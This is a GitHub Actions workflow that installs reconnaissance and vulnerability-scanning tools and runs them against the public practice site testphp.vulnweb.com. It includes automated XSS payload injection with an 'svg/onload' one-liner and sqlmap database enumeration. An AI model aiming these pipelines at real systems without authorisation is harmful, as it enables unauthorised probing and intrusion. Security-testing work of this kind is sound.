name: 'Security Tools Scan'
on:
  push:
    branches: ["main"]
  workflow_dispatch:

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up Go
        uses: actions/setup-go@v3
        with:
          go-version: '1.21'

      - name: Install Python and other dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y python3 python3-pip curl jq git

      - name: Install Go tools and dependencies
        run: |
          # Ensure GOPATH is set
          export GOPATH=$HOME/go
          export PATH=$PATH:$GOPATH/bin

          # Install Go tools using go install with versions
          go install github.com/tomnomnom/assetfinder@latest
          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
          go install github.com/tomnomnom/httprobe@latest
          go install github.com/tomnomnom/waybackurls@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/tomnomnom/gf@latest
          go install github.com/tomnomnom/anew@latest
          go install github.com/tomnomnom/fff@latest
          go install github.com/jaeles-project/gospider@latest
          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
          go install github.com/hahwul/dalfox/v2@latest
          go install github.com/Emoe/kxss@latest

      - name: Verify installation
        run: |
          echo $PATH
          which kxss || echo "kxss not found"
          which dalfox || echo "dalfox not found"
          which nuclei || echo "nuclei not found"
        shell: bash

      - name: Install NucleiFuzzer and Dependencies
        run: |
          # Install NucleiFuzzer
          git clone https://github.com/0xKayala/NucleiFuzzer.git
          cd NucleiFuzzer
          sudo chmod +x install.sh
          ./install.sh
          nf -h
          cd ..

          # Install ParamSpider
          git clone https://github.com/0xKayala/ParamSpider.git

          # Install Fuzzing Templates
          git clone https://github.com/0xKayala/fuzzing-templates.git
        shell: bash

      - name: Collect Subdomains
        run: |
          # Run assetfinder and subfinder to collect subdomains
          ~/go/bin/assetfinder --subs-only testphp.vulnweb.com | ~/go/bin/anew subdomain.txt
          ~/go/bin/subfinder -d testphp.vulnweb.com | ~/go/bin/anew subdomain.txt
        shell: bash

      - name: Run httprobe
        run: |
          cat subdomain.txt | ~/go/bin/httprobe -c 50 > "${{ runner.temp }}/httprobe.out"
        shell: bash

      - name: Run waybackurls
        run: |
          echo testphp.vulnweb.com | ~/go/bin/waybackurls | sort -u > "${{ runner.temp }}/waybackurls.out"
        shell: bash

      - name: Run httpx
        run: |
          cat subdomain.txt | ~/go/bin/httpx -ports 80,443,8080,8443 -title -status-code -json > "${{ runner.temp }}/httpx.out"
        shell: bash

      - name: Run NucleiFuzzer on Subdomains
        run: |
          cd NucleiFuzzer
          nf -l ../subdomain.txt -o ../fuzzer_output.txt
          cd ..
        shell: bash

      - name: Run additional tools
        run: |
          export PATH=$PATH:$HOME/go/bin

          # Additional commands
          cat subdomain.txt | ~/go/bin/anew "${{ runner.temp }}/domains" | tee "${{ runner.temp }}/step_domains.txt"
          cat subdomain.txt | ~/go/bin/httprobe -c 50 | ~/go/bin/anew "${{ runner.temp }}/hosth" | tee "${{ runner.temp }}/step_httprobe.txt"
          cat "${{ runner.temp }}/hosth" | ~/go/bin/fff -d 1 -S -o "${{ runner.temp }}/roots" | tee "${{ runner.temp }}/step_fff.txt"
          ~/go/bin/gf meg-headers < "${{ runner.temp }}/roots" | tee "${{ runner.temp }}/step_meg_headers.txt"
          ~/go/bin/gf servers < "${{ runner.temp }}/roots" | ~/go/bin/anew "${{ runner.temp }}/gf-servers" | tee "${{ runner.temp }}/step_gf_servers.txt"

          # Run additional security scans
          echo "assets.testphp.vulnweb.com" | ~/go/bin/waybackurls | ~/go/bin/httpx -silent | ~/go/bin/kxss -c 100 -p Xss | sort -u | ~/go/bin/dalfox pipe | tee "${{ runner.temp }}/step_xss_scan.txt"

          # Simple Reflected XSS
          cat subdomain.txt | ~/go/bin/httprobe -c 100 > "${{ runner.temp }}/target.txt" | tee "${{ runner.temp }}/step_target.txt"
          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls | ~/go/bin/gf xss | ~/go/bin/kxss | tee "${{ runner.temp }}/step_reflected_xss.txt"

          # Wayback URL collecting
          cat "${{ runner.temp }}/target.txt" | ~/go/bin/waybackurls | tee "${{ runner.temp }}/step_wayback_collecting.txt"

          # SQL Injection
          cat subdomain.txt | tee -a "${{ runner.temp }}/domains" | tee "${{ runner.temp }}/step_sql_domains.txt"
          cat "${{ runner.temp }}/domains" | ~/go/bin/httpx | tee -a "${{ runner.temp }}/alive.txt" | tee "${{ runner.temp }}/step_httpx_alive.txt"
          cat "${{ runner.temp }}/alive.txt" | ~/go/bin/waybackurls | tee -a "${{ runner.temp }}/urls" | tee "${{ runner.temp }}/step_wayback_urls.txt"
          ~/go/bin/gf sqli "${{ runner.temp }}/urls" >> "${{ runner.temp }}/sqli" | tee "${{ runner.temp }}/step_sqli.txt"
          sqlmap -m "${{ runner.temp }}/sqli" --dbs --batch | tee "${{ runner.temp }}/step_sqlmap.txt"

          # SQL Injection One-liner
          ~/go/bin/gau -subs testphp.vulnweb.com | cut -d / -f 3 | sort -u | tee "${{ runner.temp }}/step_sql_injection_one_liner.txt"

          # Collect .js files
          cat subdomain.txt | ~/go/bin/waybackurls | grep -E "\\.js(?:onp?)?$" | ~/go/bin/anew | tee "${{ runner.temp }}/step_js_files.txt"

          # Vulnerability detection
          cat "${{ runner.temp }}/waybackurls.out" | grep "php?id=" | tee "${{ runner.temp }}/step_vuln_detection_php.txt"
          cat "${{ runner.temp }}/waybackurls.out" | grep ".xlsx" | tee "${{ runner.temp }}/step_vuln_detection_xlsx.txt"

          # XSS one-liner
          cat "${{ runner.temp }}/waybackurls.out" | grep '=' | ~/go/bin/qsreplace '"><svg/onload=alert(1337)>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<svg/onload=alert(1337)>" && echo "$host \033[0;31mVulnerable"; done | tee "${{ runner.temp }}/step_xss_one_liner.txt"

          # Collect JS files using gau
          ~/go/bin/gau -subs testphp.vulnweb.com | cut -d"?" -f1 | grep -E "\\.js(?:onp?)?$" | tee "${{ runner.temp }}/urls.txt". 

          # Sort and save only unique URLs
          sort -u "${{ runner.temp }}/urls.txt" > "${{ runner.temp }}/unique_urls.txt"
